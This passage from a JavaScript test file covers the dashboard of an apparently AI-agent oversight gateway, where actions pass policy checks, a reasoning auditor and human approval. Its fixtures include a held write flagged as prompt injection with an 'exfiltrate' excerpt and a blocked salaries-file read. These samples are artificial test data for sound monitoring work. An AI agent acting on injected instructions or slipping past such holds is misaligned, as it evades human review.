  assert.match(allowSim.statusMessage, /Simulated/);
  assert.match(allowSim.event.title, /Simulated in browser — no gateway or auditor/);
  assert.match(allowSim.event.statusDescription, /Simulated in browser — no gateway or auditor/);
  assert.match(allowSim.event.policyExplanation, /Simulated in browser — no gateway or auditor/);
  assert.match(allowSim.event.resultPreview, /Simulated in browser — no gateway or auditor/);
  assert.equal(allowSim.event.statusLabel, "Action: executed");
  assert.equal(allowSim.approval, null);
});

test("live mode never takes the static simulation path (#209)", () => {
  const liveRun = { id: "run-live-1", isLive: true };
  const fixtureRun = { id: "run-fixture-1", isLive: false };

  // When live mode is on with a live run selected, returns live target
  const res1 = resolveSubmissionTarget(liveRun, [fixtureRun, liveRun], true);
  assert.equal(res1.mode, "live");
  assert.equal(res1.run.id, "run-live-1");

  // When live mode is on with a fixture run selected, routes to live run (never static)
  const res2 = resolveSubmissionTarget(fixtureRun, [fixtureRun, liveRun], true);
  assert.equal(res2.mode, "live");
  assert.equal(res2.run.id, "run-live-1");

  // When live mode is on with NO live runs available, refuses (never static)
  const res3 = resolveSubmissionTarget(fixtureRun, [fixtureRun], true);
  assert.equal(res3.mode, "disabled");
  assert.match(res3.error, /Simulation disabled in live gateway mode/);

  // When live mode is OFF, takes static path
  const resStatic = resolveSubmissionTarget(fixtureRun, [fixtureRun], false);
  assert.equal(resStatic.mode, "static");
});

// ---------------------------------------------------------------------------
// Issue #207: Scoping stores by run and action ID (no turn/cross-run leaks)
// ---------------------------------------------------------------------------

test("two actions in one turn share no audit or approval (#207)", () => {
  clearStores();
  const runId = "run-turn-test";
  const turnId = "turn-1";

  // Action 1: write with injection trace -> held for concern
  const act1Hold = transformApiEvent({
    id: "ev-hold-1",
    run_id: runId,
    turn_id: turnId,
    action_request_id: "act-1",
    event_type: "POLICY_HELD",
    details: {
      operation: "write_text",
      resource: "outputs/report.txt",
      reason_code: "REASONING_SCOPE_CONCERN",
    },
    reasoning_audit: {
      verdict: "CONCERN",
      concern_type: "PROMPT_INJECTION",
      explanation: "Attacker payload detected in reasoning trace",
      flagged_excerpts: ["exfiltrate"],
    },
  });
  assert.equal(act1Hold.status, "held");
  assert.equal(act1Hold.statusLabel, "HOLD (reasoning concern)");
  assert.equal(act1Hold.approvalStatus, "Pending reviewer authorization");
  assert.equal(act1Hold.reasoningAudit?.verdict, "CONCERN");

  // Action 2: allowed read in SAME turn with no reasoning or audit
  const act2Allow = transformApiEvent({
    id: "ev-allow-2",
    run_id: runId,
    turn_id: turnId,
    action_request_id: "act-2",
    event_type: "POLICY_ALLOWED",
    details: {
      operation: "read_text",
      resource: "vendor-a.txt",
    },
  });
  // Must NOT leak action 1's concern or pending approval!
  assert.equal(act2Allow.status, "allowed");
  assert.equal(act2Allow.statusLabel, "Policy: allowed");
  assert.equal(act2Allow.approvalStatus, null);
  assert.equal(act2Allow.reasoningAudit, null);
  assert.notEqual(act2Allow.reasonCode, "REASONING_SCOPE_CONCERN");

  // Action 3: deterministic policy deny in SAME turn
  const act3Deny = transformApiEvent({
    id: "ev-deny-3",
    run_id: runId,
    turn_id: turnId,
    action_request_id: "act-3",
    event_type: "POLICY_DENIED",
    details: {
      operation: "read_text",
      resource: "invoices/private/salaries.txt",
      reason_code: "POLICY_PATH_BLOCKED",
    },
  });
  // Must NOT leak action 1's approval status!
  assert.equal(act3Deny.status, "denied");
  assert.equal(act3Deny.statusLabel, "Policy: denied");
  assert.equal(act3Deny.approvalStatus, null);
  assert.equal(act3Deny.reasoningAudit, null);
});

test("the same turn ID in two runs shows no leak (#207)", () => {
  clearStores();
  const turnId = "turn-inject-01";

  // Run 1: has action with held approval and concern
  const run1Held = transformApiEvent({
    id: "ev-run1-hold",
    run_id: "run-seeded-1",
    turn_id: turnId,
    action_request_id: "act-seeded-1",
    event_type: "POLICY_HELD",
    details: {
      operation: "delete_path",
      resource: "outputs/archive.txt",
      reason_code: "APPROVAL_REQUIRED",
    },
    reasoning_audit: {
      verdict: "CONCERN",
      explanation: "Suspicious delete instruction",
    },
  });
  assert.equal(run1Held.approvalStatus, "Pending reviewer authorization");
  assert.equal(run1Held.reasoningAudit?.verdict, "CONCERN");

  // Run 2: has action with the same turn ID and action ID, but in run-seeded-2
  const run2Exec = transformApiEvent({
    id: "ev-run2-exec",
    run_id: "run-seeded-2",
    turn_id: turnId,
    action_request_id: "act-seeded-1",
    event_type: "POLICY_ALLOWED",
    details: {
      operation: "read_text",
      resource: "invoices/approved/inv1.txt",
    },
  });
  // Must NOT see run 1's approval or audit
  assert.equal(run2Exec.approvalStatus, null);
  assert.equal(run2Exec.reasoningAudit, null);
  assert.notEqual(run2Exec.reasonCode, "REASONING_SCOPE_CONCERN");

  // Calling clearStores() resets all stores completely
  clearStores();
  assert.equal(auditStore.size, 0);
  assert.equal(actionRequestStore.size, 0);
  assert.equal(approvalStore.size, 0);
});

// ---------------------------------------------------------------------------
// Issue #208: Approval card data formatting (reason, args, run, expiry)
// ---------------------------------------------------------------------------

test("formatApprovalCardData displays reason, arguments preview, run, and expiry (#208)", () => {
  const dummyRun = {
    id: "run-approval-test",
    name: "Invoice Processing (Live)",
    events: [
      {
        id: "ev-hold-1",
        action_request_id: "act-del-1",
        reasonCode: "REASONING_SCOPE_CONCERN",
        statusLabel: "HOLD (reasoning concern)",
        arguments: { path: "outputs/secret.txt", content: "forbidden payload" },
        expires_at: "2026-10-15T12:00:00Z",
      },
    ],
  };

  const appr = {
    id: "appr-1",
    run_id: "run-approval-test",
    action_request_id: "act-del-1",
    operation: "write_text",
    resource: "outputs/secret.txt",
    requested_at: "2026-10-15T11:55:00Z",
    expires_at: "2026-10-15T12:00:00Z",
  };

  const data = formatApprovalCardData(appr, [dummyRun], dummyRun);
  assert.equal(data.runName, "Invoice Processing (Live)");
  assert.equal(data.holdReason, "Reasoning scope concern");
  assert.match(data.argsPreview, /forbidden payload/);
  assert.equal(data.expiryText, "12:00:00");
  assert.equal(data.timelineEvent?.id, "ev-hold-1");
});

test("maps every backend EventType to its expected status (#206)", () => {
  const mapping = {
    RUN_CREATED: "attempted",
    ACTION_REQUESTED: "attempted",
    POLICY_ALLOWED: "allowed",
    POLICY_DENIED: "denied",
    POLICY_HELD: "held",
    APPROVAL_REQUESTED: "held",
    APPROVAL_GRANTED: "approved",
    APPROVAL_DENIED: "denied",
    APPROVAL_EXPIRED: "failed",
    EXECUTION_STARTED: "attempted",
    EXECUTION_SUCCEEDED: "executed",
    EXECUTION_FAILED: "failed",
    RUN_COMPLETED: "executed",
    SYSTEM_ERROR: "failed",
    REASONING_AUDIT_COMPLETED: "allowed",
    REASONING_AUDIT_FAILED: "held",
  };

  for (const [eventType, expectedStatus] of Object.entries(mapping)) {
    const res = transformApiEvent({
      id: `ev-map-${eventType}`,
      sequence: 1,
      event_type: eventType,
      details: {
        operation: "test_op",
        resource: "test/res",
      },
    });
    assert.equal(
      res.status,
      expectedStatus,
      `EventType.${eventType} must map to status '${expectedStatus}', got '${res.status}'`
    );
    assert.ok(STATUS_FACETS.includes(res.status), `status '${res.status}' must be in STATUS_FACETS`);
  }
});

test("a failed execution never shows executed and a reviewer denial never says policy (#206)", () => {
  // 1. Action allowed by policy, but execution failed
  const events = [
    transformApiEvent({
      id: "ev-allow-1",
      sequence: 1,
      action_request_id: "act-fail-test",
      event_type: "POLICY_ALLOWED",
      details: { operation: "read_text", resource: "invoices/approved/nope.txt" },
    }),
    transformApiEvent({
      id: "ev-exec-fail-1",
      sequence: 2,
      action_request_id: "act-fail-test",
      event_type: "EXECUTION_FAILED",
      details: {
        operation: "read_text",
        resource: "invoices/approved/nope.txt",
        result: { exit_code: 1, stderr: "No such file" },
      },
    }),
  ];

  reconcileRunActionStates(events);

  for (const ev of events) {
    assert.notEqual(ev.status, "executed", "failed action event must never show executed");
    assert.equal(ev.executionStatus, "FAILED", "execution status must be FAILED");
    assert.match(ev.execution, /failed/, "execution label must describe failure");
  }
  assert.equal(events[0].status, "allowed", "policy allowed event status remains allowed");
  assert.equal(events[1].status, "failed", "execution failed event status is failed");

  // 2. Reviewer denial never mentions policy in its statusLabel or description
  const denialEv = transformApiEvent({
    id: "ev-deny-human",
    sequence: 3,
    action_request_id: "act-deny-test",
    event_type: "APPROVAL_DENIED",
    actor: "security-reviewer",
    details: { reason: "Suspicious target path" },
  });
  assert.equal(denialEv.status, "denied");
  assert.equal(denialEv.statusLabel, "Reviewer: denied");
  assert.doesNotMatch(denialEv.statusLabel, /policy/i, "reviewer denial label must never say policy");
  assert.doesNotMatch(denialEv.statusDescription, /policy/i, "reviewer denial description must never say policy");
});

test("after approve/deny/expire every row for that action shows the final resolution (#206)", () => {
  // Scenario A: Held -> Approved
  const approvedActionEvents = [
    transformApiEvent({
      id: "ev-a1",
      sequence: 1,
      action_request_id: "act-appr",
      event_type: "ACTION_REQUESTED",
      details: { operation: "write_text", resource: "out.txt" },
    }),
    transformApiEvent({
      id: "ev-a2",
      sequence: 2,
      action_request_id: "act-appr",
      event_type: "POLICY_HELD",
      details: { reason_code: "APPROVAL_REQUIRED" },
    }),
    transformApiEvent({
      id: "ev-a3",
      sequence: 3,
      action_request_id: "act-appr",
      event_type: "APPROVAL_GRANTED",
      actor: "lead-reviewer",
      details: { reason: "Approved for release" },
    }),
  ];
  reconcileRunActionStates(approvedActionEvents);
  assert.equal(approvedActionEvents[1].status, "approved");
  assert.equal(approvedActionEvents[1].statusLabel, "Reviewer: approved");
  assert.equal(approvedActionEvents[1].approvalStatus, "Approved");
  assert.equal(approvedActionEvents[1].resolvedBy, "lead-reviewer");

  // Scenario B: Held -> Denied
  const deniedActionEvents = [
    transformApiEvent({
      id: "ev-b1",
      sequence: 1,
      action_request_id: "act-denied",
      event_type: "POLICY_HELD",
      details: { reason_code: "APPROVAL_REQUIRED" },
    }),
    transformApiEvent({
      id: "ev-b2",
      sequence: 2,
      action_request_id: "act-denied",
      event_type: "APPROVAL_DENIED",
      actor: "lead-reviewer",
      details: { reason: "Out of scope" },
    }),
  ];
  reconcileRunActionStates(deniedActionEvents);
  assert.equal(deniedActionEvents[0].status, "denied");
  assert.equal(deniedActionEvents[0].statusLabel, "Reviewer: denied");
  assert.equal(deniedActionEvents[0].approvalStatus, "Denied");
  assert.doesNotMatch(deniedActionEvents[0].statusLabel, /policy/i);

  // Scenario C: Held -> Expired
  const expiredActionEvents = [
    transformApiEvent({
      id: "ev-c1",
      sequence: 1,
      action_request_id: "act-exp",
      event_type: "POLICY_HELD",
      details: { reason_code: "APPROVAL_REQUIRED" },
    }),
    transformApiEvent({
      id: "ev-c2",
      sequence: 2,
      action_request_id: "act-exp",
      event_type: "APPROVAL_EXPIRED",
      details: { reason: "TTL exceeded" },
    }),
  ];
  reconcileRunActionStates(expiredActionEvents);
  assert.equal(expiredActionEvents[0].status, "failed");
  assert.equal(expiredActionEvents[0].statusLabel, "Reviewer: expired");
  assert.equal(expiredActionEvents[0].approvalStatus, "Expired");
});

test("each of the seven states renders a distinct label and glyph (#206)", () => {
  assert.equal(STATUS_FACETS.length, 7);
  const glyphs = new Set();
  for (const st of STATUS_FACETS) {
    const glyph = getStatusGlyph(st);
    assert.ok(glyph, `glyph for ${st} must be non-empty`);
    assert.ok(!glyphs.has(glyph), `glyph '${glyph}' for ${st} must be unique`);
    glyphs.add(glyph);
  }
});
